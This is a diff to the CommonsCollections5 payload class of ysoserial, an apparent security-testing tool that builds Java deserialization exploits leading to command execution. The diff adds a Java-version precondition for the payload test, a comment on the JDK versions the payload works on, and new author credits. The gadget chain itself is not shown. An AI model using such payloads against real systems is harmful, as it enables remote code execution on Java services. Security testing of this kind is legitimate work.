@@ -18,6 +18,7 @@ import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.JavaVersion;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
@@ -43,10 +44,16 @@ import ysoserial.payloads.util.Reflections;
 	Requires:
 		commons-collections
  */
-@PayloadTest(skip="need more robust way to detect Runtime.exec() without SecurityManager()")
+/*
+This only works in JDK 8u76 and WITHOUT a security manager
+
+https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
+ */
+//@PayloadTest(skip="need more robust way to detect Runtime.exec() without SecurityManager()")
 @SuppressWarnings({"rawtypes", "unchecked"})
+@PayloadTest ( precondition = "isApplicableJavaVersion")
 @Dependencies({"commons-collections:commons-collections:3.1"})
-@Authors({ Authors.FROHOFF })
+@Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
 public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
 
 	public BadAttributeValueExpException getObject(final String command) throws Exception {
@@ -86,4 +93,9 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 	public static void main(final String[] args) throws Exception {
 		PayloadRunner.run(CommonsCollections5.class, args);
 	}
+
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isBadAttrValExcReadObj();
+    }
+
 }
